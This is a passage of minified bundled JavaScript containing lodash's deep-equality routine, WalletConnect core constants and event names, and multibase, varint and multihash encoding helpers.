t=200,i="__lodash_hash_undefined__",n=1,s=2,o=9007199254740991,a="[object Arguments]",c="[object Array]",l="[object AsyncFunction]",u="[object Boolean]",d="[object Date]",h="[object Error]",f="[object Function]",p="[object GeneratorFunction]",g="[object Map]",w="[object Number]",m="[object Null]",x="[object Object]",S="[object Promise]",T="[object Proxy]",k="[object RegExp]",I="[object Set]",E="[object String]",C="[object Symbol]",N="[object Undefined]",L="[object WeakMap]",$="[object ArrayBuffer]",y="[object DataView]",A="[object Float32Array]",b="[object Float64Array]",v="[object Int8Array]",_="[object Int16Array]",O="[object Int32Array]",D="[object Uint8Array]",R="[object Uint8ClampedArray]",P="[object Uint16Array]",B="[object Uint32Array]",M=/[\\^$.*+?()[\]{}|]/g,W=/^\[object .+?Constructor\]$/,K=/^(?:0|[1-9]\d*)$/,q={};q[A]=q[b]=q[v]=q[_]=q[O]=q[D]=q[R]=q[P]=q[B]=!0,q[a]=q[c]=q[$]=q[u]=q[y]=q[d]=q[h]=q[f]=q[g]=q[w]=q[x]=q[k]=q[I]=q[E]=q[L]=!1;var J=typeof Po=="object"&&Po&&Po.Object===Object&&Po,le=typeof self=="object"&&self&&self.Object===Object&&self,ae=J||le||Function("return this")(),U=e&&!e.nodeType&&e,G=U&&!0&&r&&!r.nodeType&&r,Z=G&&G.exports===U,j=Z&&J.process,Y=function(){try{return j&&j.binding&&j.binding("util")}catch{}}(),se=Y&&Y.isTypedArray;function ne(ue,Ce){for(var Ue=-1,Rt=ue==null?0:ue.length,ln=0,Ir=[];++Ue<Rt;){var On=ue[Ue];Ce(On,Ue,ue)&&(Ir[ln++]=On)}return Ir}function Te(ue,Ce){for(var Ue=-1,Rt=Ce.length,ln=ue.length;++Ue<Rt;)ue[ln+Ue]=Ce[Ue];return ue}function Re(ue,Ce){for(var Ue=-1,Rt=ue==null?0:ue.length;++Ue<Rt;)if(Ce(ue[Ue],Ue,ue))return!0;return!1}function $e(ue,Ce){for(var Ue=-1,Rt=Array(ue);++Ue<ue;)Rt[Ue]=Ce(Ue);return Rt}function Ae(ue){return function(Ce){return ue(Ce)}}function De(ue,Ce){return ue.has(Ce)}function Le(ue,Ce){return ue?.[Ce]}function it(ue){var Ce=-1,Ue=Array(ue.size);return ue.forEach(function(Rt,ln){Ue[++Ce]=[ln,Rt]}),Ue}function nt(ue,Ce){return function(Ue){return ue(Ce(Ue))}}function ct(ue){var Ce=-1,Ue=Array(ue.size);return ue.forEach(function(Rt){Ue[++Ce]=Rt}),Ue}var St=Array.prototype,zt=Function.prototype,Q=Object.prototype,z=ae["__core-js_shared__"],H=zt.toString,ie=Q.hasOwnProperty,pe=function(){var ue=/[^.]+$/.exec(z&&z.keys&&z.keys.IE_PROTO||"");return ue?"Symbol(src)_1."+ue:""}(),we=Q.toString,_e=RegExp("^"+H.call(ie).replace(M,"\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,"$1.*?")+"$"),et=Z?ae.Buffer:void 0,yt=ae.Symbol,Ye=ae.Uint8Array,$t=Q.propertyIsEnumerable,xt=St.splice,Mt=yt?yt.toStringTag:void 0,Pr=Object.getOwnPropertySymbols,Ur=et?et.isBuffer:void 0,Vt=nt(Object.keys,Object),jr=R2(ae,"DataView"),Br=R2(ae,"Map"),Ct=R2(ae,"Promise"),er=R2(ae,"Set"),tr=R2(ae,"WeakMap"),mt=R2(Object,"create"),or=Up(jr),ar=Up(Br),It=Up(Ct),cr=Up(er),lr=Up(tr),At=yt?yt.prototype:void 0,rr=At?At.valueOf:void 0;function Kt(ue){var Ce=-1,Ue=ue==null?0:ue.length;for(this.clear();++Ce<Ue;){var Rt=ue[Ce];this.set(Rt[0],Rt[1])}}function wt(){this.__data__=mt?mt(null):{},this.size=0}function ir(ue){var Ce=this.has(ue)&&delete this.__data__[ue];return this.size-=Ce?1:0,Ce}function ur(ue){var Ce=this.__data__;if(mt){var Ue=Ce[ue];return Ue===i?void 0:Ue}return ie.call(Ce,ue)?Ce[ue]:void 0}function Tt(ue){var Ce=this.__data__;return mt?Ce[ue]!==void 0:ie.call(Ce,ue)}function ui(ue,Ce){var Ue=this.__data__;return this.size+=this.has(ue)?0:1,Ue[ue]=mt&&Ce===void 0?i:Ce,this}Kt.prototype.clear=wt,Kt.prototype.delete=ir,Kt.prototype.get=ur,Kt.prototype.has=Tt,Kt.prototype.set=ui;function Ar(ue){var Ce=-1,Ue=ue==null?0:ue.length;for(this.clear();++Ce<Ue;){var Rt=ue[Ce];this.set(Rt[0],Rt[1])}}function ri(){this.__data__=[],this.size=0}function qn(ue){var Ce=this.__data__,Ue=je(Ce,ue);if(Ue<0)return!1;var Rt=Ce.length-1;return Ue==Rt?Ce.pop():xt.call(Ce,Ue,1),--this.size,!0}function yo(ue){var Ce=this.__data__,Ue=je(Ce,ue);return Ue<0?void 0:Ce[Ue][1]}function xo(ue){return je(this.__data__,ue)>-1}function Co(ue,Ce){var Ue=this.__data__,Rt=je(Ue,ue);return Rt<0?(++this.size,Ue.push([ue,Ce])):Ue[Rt][1]=Ce,this}Ar.prototype.clear=ri,Ar.prototype.delete=qn,Ar.prototype.get=yo,Ar.prototype.has=xo,Ar.prototype.set=Co;function Rn(ue){var Ce=-1,Ue=ue==null?0:ue.length;for(this.clear();++Ce<Ue;){var Rt=ue[Ce];this.set(Rt[0],Rt[1])}}function Al(){this.size=0,this.__data__={hash:new Kt,map:new(Br||Ar),string:new Kt}}function Il(ue){var Ce=q0(this,ue).delete(ue);return this.size-=Ce?1:0,Ce}function Tl(ue){return q0(this,ue).get(ue)}function kl(ue){return q0(this,ue).has(ue)}function Nl(ue,Ce){var Ue=q0(this,ue),Rt=Ue.size;return Ue.set(ue,Ce),this.size+=Ue.size==Rt?0:1,this}Rn.prototype.clear=Al,Rn.prototype.delete=Il,Rn.prototype.get=Tl,Rn.prototype.has=kl,Rn.prototype.set=Nl;function yn(ue){var Ce=-1,Ue=ue==null?0:ue.length;for(this.__data__=new Rn;++Ce<Ue;)this.add(ue[Ce])}function Pl(ue){return this.__data__.set(ue,i),this}function $l(ue){return this.__data__.has(ue)}yn.prototype.add=yn.prototype.push=Pl,yn.prototype.has=$l;function Ts(ue){var Ce=this.__data__=new Ar(ue);this.size=Ce.size}function Rl(){this.__data__=new Ar,this.size=0}function X(ue){var Ce=this.__data__,Ue=Ce.delete(ue);return this.size=Ce.size,Ue}function ee(ue){return this.__data__.get(ue)}function ce(ue){return this.__data__.has(ue)}function ve(ue,Ce){var Ue=this.__data__;if(Ue instanceof Ar){var Rt=Ue.__data__;if(!Br||Rt.length<t-1)return Rt.push([ue,Ce]),this.size=++Ue.size,this;Ue=this.__data__=new Rn(Rt)}return Ue.set(ue,Ce),this.size=Ue.size,this}Ts.prototype.clear=Rl,Ts.prototype.delete=X,Ts.prototype.get=ee,Ts.prototype.has=ce,Ts.prototype.set=ve;function Oe(ue,Ce){var Ue=v6(ue),Rt=!Ue&&xae(ue),ln=!Ue&&!Rt&&RE(ue),Ir=!Ue&&!Rt&&!ln&&LB(ue),On=Ue||Rt||ln||Ir,ks=On?$e(ue.length,String):[],Gs=ks.length;for(var _n in ue)ie.call(ue,_n)&&!(On&&(_n=="length"||ln&&(_n=="offset"||_n=="parent")||Ir&&(_n=="buffer"||_n=="byteLength"||_n=="byteOffset")||mae(_n,Gs)))&&ks.push(_n);return ks}function je(ue,Ce){for(var Ue=ue.length;Ue--;)if(OB(ue[Ue][0],Ce))return Ue;return-1}function bt(ue,Ce,Ue){var Rt=Ce(ue);return v6(ue)?Rt:Te(Rt,Ue(ue))}function lt(ue){return ue==null?ue===void 0?N:m:Mt&&Mt in Object(ue)?pae(ue):yae(ue)}function Ti(ue){return eb(ue)&&lt(ue)==a}function zn(ue,Ce,Ue,Rt,ln){return ue===Ce?!0:ue==null||Ce==null||!eb(ue)&&!eb(Ce)?ue!==ue&&Ce!==Ce:ia(ue,Ce,Ue,Rt,zn,ln)}function ia(ue,Ce,Ue,Rt,ln,Ir){var On=v6(ue),ks=v6(Ce),Gs=On?c:z0(ue),_n=ks?c:z0(Ce);Gs=Gs==a?x:Gs,_n=_n==a?x:_n;var Ha=Gs==x,Ml=_n==x,Eo=Gs==_n;if(Eo&&RE(ue)){if(!RE(Ce))return!1;On=!0,Ha=!1}if(Eo&&!Ha)return Ir||(Ir=new Ts),On||LB(ue)?na(ue,Ce,Ue,Rt,ln,Ir):Wa(ue,Ce,Gs,Ue,Rt,ln,Ir);if(!(Ue&n)){var Pc=Ha&&ie.call(ue,"__wrapped__"),$c=Ml&&ie.call(Ce,"__wrapped__");if(Pc||$c){var W0=Pc?ue.value():ue,lh=$c?Ce.value():Ce;return Ir||(Ir=new Ts),ln(W0,lh,Ue,Rt,Ir)}}return Eo?(Ir||(Ir=new Ts),$2(ue,Ce,Ue,Rt,ln,Ir)):!1}function qo(ue){if(!DB(ue)||bae(ue))return!1;var Ce=BB(ue)?_e:W;return Ce.test(Up(ue))}function Ol(ue){return eb(ue)&&MB(ue.length)&&!!q[lt(ue)]}function P2(ue){if(!vae(ue))return Vt(ue);var Ce=[];for(var Ue in Object(ue))ie.call(ue,Ue)&&Ue!="constructor"&&Ce.push(Ue);return Ce}function na(ue,Ce,Ue,Rt,ln,Ir){var On=Ue&n,ks=ue.length,Gs=Ce.length;if(ks!=Gs&&!(On&&Gs>ks))return!1;var _n=Ir.get(ue);if(_n&&Ir.get(Ce))return _n==Ce;var Ha=-1,Ml=!0,Eo=Ue&s?new yn:void 0;for(Ir.set(ue,Ce),Ir.set(Ce,ue);++Ha<ks;){var Pc=ue[Ha],$c=Ce[Ha];if(Rt)var W0=On?Rt($c,Pc,Ha,Ce,ue,Ir):Rt(Pc,$c,Ha,ue,Ce,Ir);if(W0!==void 0){if(W0)continue;Ml=!1;break}if(Eo){if(!Re(Ce,function(lh,jp){if(!De(Eo,jp)&&(Pc===lh||ln(Pc,lh,Ue,Rt,Ir)))return Eo.push(jp)})){Ml=!1;break}}else if(!(Pc===$c||ln(Pc,$c,Ue,Rt,Ir))){Ml=!1;break}}return Ir.delete(ue),Ir.delete(Ce),Ml}function Wa(ue,Ce,Ue,Rt,ln,Ir,On){switch(Ue){case y:if(ue.byteLength!=Ce.byteLength||ue.byteOffset!=Ce.byteOffset)return!1;ue=ue.buffer,Ce=Ce.buffer;case $:return!(ue.byteLength!=Ce.byteLength||!Ir(new Ye(ue),new Ye(Ce)));case u:case d:case w:return OB(+ue,+Ce);case h:return ue.name==Ce.name&&ue.message==Ce.message;case k:case E:return ue==Ce+"";case g:var ks=it;case I:var Gs=Rt&n;if(ks||(ks=ct),ue.size!=Ce.size&&!Gs)return!1;var _n=On.get(ue);if(_n)return _n==Ce;Rt|=s,On.set(ue,Ce);var Ha=na(ks(ue),ks(Ce),Rt,ln,Ir,On);return On.delete(ue),Ha;case C:if(rr)return rr.call(ue)==rr.call(Ce)}return!1}function $2(ue,Ce,Ue,Rt,ln,Ir){var On=Ue&n,ks=Bl(ue),Gs=ks.length,_n=Bl(Ce),Ha=_n.length;if(Gs!=Ha&&!On)return!1;for(var Ml=Gs;Ml--;){var Eo=ks[Ml];if(!(On?Eo in Ce:ie.call(Ce,Eo)))return!1}var Pc=Ir.get(ue);if(Pc&&Ir.get(Ce))return Pc==Ce;var $c=!0;Ir.set(ue,Ce),Ir.set(Ce,ue);for(var W0=On;++Ml<Gs;){Eo=ks[Ml];var lh=ue[Eo],jp=Ce[Eo];if(Rt)var UB=On?Rt(jp,lh,Eo,Ce,ue,Ir):Rt(lh,jp,Eo,ue,Ce,Ir);if(!(UB===void 0?lh===jp||ln(lh,jp,Ue,Rt,Ir):UB)){$c=!1;break}W0||(W0=Eo=="constructor")}if($c&&!W0){var y6=ue.constructor,x6=Ce.constructor;y6!=x6&&"constructor"in ue&&"constructor"in Ce&&!(typeof y6=="function"&&y6 instanceof y6&&typeof x6=="function"&&x6 instanceof x6)&&($c=!1)}return Ir.delete(ue),Ir.delete(Ce),$c}function Bl(ue){return bt(ue,_ae,gae)}function q0(ue,Ce){var Ue=ue.__data__;return wae(Ce)?Ue[typeof Ce=="string"?"string":"hash"]:Ue.map}function R2(ue,Ce){var Ue=Le(ue,Ce);return qo(Ue)?Ue:void 0}function pae(ue){var Ce=ie.call(ue,Mt),Ue=ue[Mt];try{ue[Mt]=void 0;var Rt=!0}catch{}var ln=we.call(ue);return Rt&&(Ce?ue[Mt]=Ue:delete ue[Mt]),ln}var gae=Pr?function(ue){return ue==null?[]:(ue=Object(ue),ne(Pr(ue),function(Ce){return $t.call(ue,Ce)}))}:Sae,z0=lt;(jr&&z0(new jr(new ArrayBuffer(1)))!=y||Br&&z0(new Br)!=g||Ct&&z0(Ct.resolve())!=S||er&&z0(new er)!=I||tr&&z0(new tr)!=L)&&(z0=function(ue){var Ce=lt(ue),Ue=Ce==x?ue.constructor:void 0,Rt=Ue?Up(Ue):"";if(Rt)switch(Rt){case or:return y;case ar:return g;case It:return S;case cr:return I;case lr:return L}return Ce});function mae(ue,Ce){return Ce=Ce??o,!!Ce&&(typeof ue=="number"||K.test(ue))&&ue>-1&&ue%1==0&&ue<Ce}function wae(ue){var Ce=typeof ue;return Ce=="string"||Ce=="number"||Ce=="symbol"||Ce=="boolean"?ue!=="__proto__":ue===null}function bae(ue){return!!pe&&pe in ue}function vae(ue){var Ce=ue&&ue.constructor,Ue=typeof Ce=="function"&&Ce.prototype||Q;return ue===Ue}function yae(ue){return we.call(ue)}function Up(ue){if(ue!=null){try{return H.call(ue)}catch{}try{return ue+""}catch{}}return""}function OB(ue,Ce){return ue===Ce||ue!==ue&&Ce!==Ce}var xae=Ti(function(){return arguments}())?Ti:function(ue){return eb(ue)&&ie.call(ue,"callee")&&!$t.call(ue,"callee")},v6=Array.isArray;function Cae(ue){return ue!=null&&MB(ue.length)&&!BB(ue)}var RE=Ur||Aae;function Eae(ue,Ce){return zn(ue,Ce)}function BB(ue){if(!DB(ue))return!1;var Ce=lt(ue);return Ce==f||Ce==p||Ce==l||Ce==T}function MB(ue){return typeof ue=="number"&&ue>-1&&ue%1==0&&ue<=o}function DB(ue){var Ce=typeof ue;return ue!=null&&(Ce=="object"||Ce=="function")}function eb(ue){return ue!=null&&typeof ue=="object"}var LB=se?Ae(se):Ol;function _ae(ue){return Cae(ue)?Oe(ue):P2(ue)}function Sae(){return[]}function Aae(){return!1}r.exports=Eae}(n5,n5.exports)),n5.exports}var k8e=T8e();const N8e=Ss(k8e),uX="wc",dX=2,Pk="core",$d=`${uX}@2:${Pk}:`,P8e={logger:"error"},$8e={database:":memory:"},R8e="crypto",Ij="client_ed25519_seed",O8e=fe.ONE_DAY,B8e="keychain",M8e="0.3",D8e="messages",L8e="0.3",Tj=fe.SIX_HOURS,U8e="publisher",hX="irn",j8e="error",fX="wss://relay.walletconnect.org",F8e="relayer",js={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},q8e="_subscription",Oc={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},z8e=.1,$k="2.18.0",an={link_mode:"link_mode",relay:"relay"},W8e="0.3",H8e="WALLETCONNECT_CLIENT_ID",kj="WALLETCONNECT_LINK_MODE_APPS",Qa={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},V8e="subscription",K8e="0.3",G8e=fe.FIVE_SECONDS*1e3,Z8e="pairing",Y8e="0.3",yb={wc_pairingDelete:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:fe.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:fe.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:0},res:{ttl:fe.ONE_DAY,prompt:!1,tag:0}}},c1={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},Ul={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},J8e="history",Q8e="0.3",X8e="expirer",Kc={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},e9e="0.3",t9e="verify-api",r9e="https://verify.walletconnect.com",pX="https://verify.walletconnect.org",A5=pX,i9e=`${A5}/v3`,n9e=[r9e,pX],s9e="echo",o9e="https://echo.walletconnect.com",ed={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},Nh={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},jl={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success"},Wp={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found"},Hp={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},xb={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},a9e=.1,c9e="event-client",l9e=86400,u9e="https://pulse.walletconnect.org/batch";function d9e(r,e){if(r.length>=255)throw new TypeError("Alphabet too long");for(var t=new Uint8Array(256),i=0;i<t.length;i++)t[i]=255;for(var n=0;n<r.length;n++){var s=r.charAt(n),o=s.charCodeAt(0);if(t[o]!==255)throw new TypeError(s+" is ambiguous");t[o]=n}var a=r.length,c=r.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function d(p){if(p instanceof Uint8Array||(ArrayBuffer.isView(p)?p=new Uint8Array(p.buffer,p.byteOffset,p.byteLength):Array.isArray(p)&&(p=Uint8Array.from(p))),!(p instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(p.length===0)return"";for(var g=0,w=0,m=0,x=p.length;m!==x&&p[m]===0;)m++,g++;for(var S=(x-m)*u+1>>>0,T=new Uint8Array(S);m!==x;){for(var k=p[m],I=0,E=S-1;(k!==0||I<w)&&E!==-1;E--,I++)k+=256*T[E]>>>0,T[E]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");w=I,m++}for(var C=S-w;C!==S&&T[C]===0;)C++;for(var N=c.repeat(g);C<S;++C)N+=r.charAt(T[C]);return N}function h(p){if(typeof p!="string")throw new TypeError("Expected String");if(p.length===0)return new Uint8Array;var g=0;if(p[g]!==" "){for(var w=0,m=0;p[g]===c;)w++,g++;for(var x=(p.length-g)*l+1>>>0,S=new Uint8Array(x);p[g];){var T=t[p.charCodeAt(g)];if(T===255)return;for(var k=0,I=x-1;(T!==0||k<m)&&I!==-1;I--,k++)T+=a*S[I]>>>0,S[I]=T%256>>>0,T=T/256>>>0;if(T!==0)throw new Error("Non-zero carry");m=k,g++}if(p[g]!==" "){for(var E=x-m;E!==x&&S[E]===0;)E++;for(var C=new Uint8Array(w+(x-E)),N=w;E!==x;)C[N++]=S[E++];return C}}}function f(p){var g=h(p);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:d,decodeUnsafe:h,decode:f}}var h9e=d9e,f9e=h9e;const gX=r=>{if(r instanceof Uint8Array&&r.constructor.name==="Uint8Array")return r;if(r instanceof ArrayBuffer)return new Uint8Array(r);if(ArrayBuffer.isView(r))return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);throw new Error("Unknown type, must be binary type")},p9e=r=>new TextEncoder().encode(r),g9e=r=>new TextDecoder().decode(r);let m9e=class{constructor(e,t,i){this.name=e,this.prefix=t,this.baseEncode=i}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},w9e=class{constructor(e,t,i){if(this.name=e,this.prefix=t,t.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=i}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return mX(this,e)}},b9e=class{constructor(e){this.decoders=e}or(e){return mX(this,e)}decode(e){const t=e[0],i=this.decoders[t];if(i)return i.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const mX=(r,e)=>new b9e({...r.decoders||{[r.prefix]:r},...e.decoders||{[e.prefix]:e}});let v9e=class{constructor(e,t,i,n){this.name=e,this.prefix=t,this.baseEncode=i,this.baseDecode=n,this.encoder=new m9e(e,t,i),this.decoder=new w9e(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const lC=({name:r,prefix:e,encode:t,decode:i})=>new v9e(r,e,t,i),m4=({prefix:r,name:e,alphabet:t})=>{const{encode:i,decode:n}=f9e(t,e);return lC({prefix:r,name:e,encode:i,decode:s=>gX(n(s))})},y9e=(r,e,t,i)=>{const n={};for(let u=0;u<e.length;++u)n[e[u]]=u;let s=r.length;for(;r[s-1]==="=";)--s;const o=new Uint8Array(s*t/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const d=n[r[u]];if(d===void 0)throw new SyntaxError(`Non-${i} character`);c=c<<t|d,a+=t,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=t||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},x9e=(r,e,t)=>{const i=e[e.length-1]==="=",n=(1<<t)-1;let s="",o=0,a=0;for(let c=0;c<r.length;++c)for(a=a<<8|r[c],o+=8;o>t;)o-=t,s+=e[n&a>>o];if(o&&(s+=e[n&a<<t-o]),i)for(;s.length*t&7;)s+="=";return s},po=({name:r,prefix:e,bitsPerChar:t,alphabet:i})=>lC({prefix:e,name:r,encode(n){return x9e(n,i,t)},decode(n){return y9e(n,i,t,r)}}),C9e=lC({prefix:"\0",name:"identity",encode:r=>g9e(r),decode:r=>p9e(r)});var E9e=Object.freeze({__proto__:null,identity:C9e});const _9e=po({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var S9e=Object.freeze({__proto__:null,base2:_9e});const A9e=po({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var I9e=Object.freeze({__proto__:null,base8:A9e});const T9e=m4({prefix:"9",name:"base10",alphabet:"0123456789"});var k9e=Object.freeze({__proto__:null,base10:T9e});const N9e=po({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),P9e=po({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var $9e=Object.freeze({__proto__:null,base16:N9e,base16upper:P9e});const R9e=po({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),O9e=po({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),B9e=po({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),M9e=po({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),D9e=po({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),L9e=po({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),U9e=po({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),j9e=po({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),F9e=po({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var q9e=Object.freeze({__proto__:null,base32:R9e,base32upper:O9e,base32pad:B9e,base32padupper:M9e,base32hex:D9e,base32hexupper:L9e,base32hexpad:U9e,base32hexpadupper:j9e,base32z:F9e});const z9e=m4({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),W9e=m4({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var H9e=Object.freeze({__proto__:null,base36:z9e,base36upper:W9e});const V9e=m4({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),K9e=m4({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var G9e=Object.freeze({__proto__:null,base58btc:V9e,base58flickr:K9e});const Z9e=po({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),Y9e=po({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),J9e=po({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),Q9e=po({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var X9e=Object.freeze({__proto__:null,base64:Z9e,base64pad:Y9e,base64url:J9e,base64urlpad:Q9e});const wX=Array.from(""),e7e=wX.reduce((r,e,t)=>(r[t]=e,r),[]),t7e=wX.reduce((r,e,t)=>(r[e.codePointAt(0)]=t,r),[]);function r7e(r){return r.reduce((e,t)=>(e+=e7e[t],e),"")}function i7e(r){const e=[];for(const t of r){const i=t7e[t.codePointAt(0)];if(i===void 0)throw new Error(`Non-base256emoji character: ${t}`);e.push(i)}return new Uint8Array(e)}const n7e=lC({prefix:"",name:"base256emoji",encode:r7e,decode:i7e});var s7e=Object.freeze({__proto__:null,base256emoji:n7e}),o7e=bX,Nj=128,a7e=-128,c7e=Math.pow(2,31);function bX(r,e,t){e=e||[],t=t||0;for(var i=t;r>=c7e;)e[t++]=r&255|Nj,r/=128;for(;r&a7e;)e[t++]=r&255|Nj,r>>>=7;return e[t]=r|0,bX.bytes=t-i+1,e}var l7e=Rk,u7e=128,Pj=127;function Rk(r,i){var t=0,i=i||0,n=0,s=i,o,a=r.length;do{if(s>=a)throw Rk.bytes=0,new RangeError("Could not decode varint");o=r[s++],t+=n<28?(o&Pj)<<n:(o&Pj)*Math.pow(2,n),n+=7}while(o>=u7e);return Rk.bytes=s-i,t}var d7e=Math.pow(2,7),h7e=Math.pow(2,14),f7e=Math.pow(2,21),p7e=Math.pow(2,28),g7e=Math.pow(2,35),m7e=Math.pow(2,42),w7e=Math.pow(2,49),b7e=Math.pow(2,56),v7e=Math.pow(2,63),y7e=function(r){return r<d7e?1:r<h7e?2:r<f7e?3:r<p7e?4:r<g7e?5:r<m7e?6:r<w7e?7:r<b7e?8:r<v7e?9:10},x7e={encode:o7e,decode:l7e,encodingLength:y7e},vX=x7e;const $j=(r,e,t=0)=>(vX.encode(r,e,t),e),Rj=r=>vX.encodingLength(r),Ok=(r,e)=>{const t=e.byteLength,i=Rj(r),n=i+Rj(t),s=new Uint8Array(n+t);return $j(r,s,0),$j(t,s,i),s.set(e,n),new C7e(r,t,e,s)};let C7e=class{constructor(e,t,i,n){this.code=e,this.size=t,this.digest=i,this.bytes=n}};const yX=({name:r,code:e,encode:t})=>new E7e(r,e,t);let E7e=class{constructor(e,t,i){this.name=e,this.code=t,this.encode=i}digest(e){if(e instanceof Uint8Array){const t=this.encode(e);return t instanceof Uint8Array?Ok(this.code,t):t.then(i=>Ok(this.code,i))}else throw Error("Unknown type, must be binary type")}};const xX=r=>async e=>new Uint8Array(await 